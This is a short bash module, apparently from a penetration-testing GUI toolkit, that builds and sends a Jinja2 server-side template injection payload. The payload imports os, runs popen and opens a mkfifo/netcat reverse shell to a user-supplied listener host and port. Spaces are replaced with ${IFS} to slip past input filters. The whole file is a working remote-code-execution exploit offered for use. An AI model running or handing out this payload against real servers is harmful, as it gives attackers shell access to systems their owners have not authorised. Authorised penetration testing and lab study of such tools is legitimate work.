#!/bin/bash

: '
SSTI - jinja2 rce dump file - linux (mkfifo)
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LHOST_FIELD=$(form_item  "LHOST"  "lhost" "${KALI_IP}")
SHELL_PORT_FIELD=$(form_item "shell port" "shell_port" "1337")

# Generate GUI form
generate_form "${LHOST_FIELD}" "${SHELL_PORT_FIELD}"

LHOST=${form_data["lhost"]}
SHELL_PORT=${form_data["shell_port"]}

SHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>%261|nc ${LHOST} ${SHELL_PORT} >/tmp/f"

execute_command "{{self.__init__.__globals__.__builtins__.__import__('os').popen('${SHELL// /\$\{IFS\}}').read()}}"
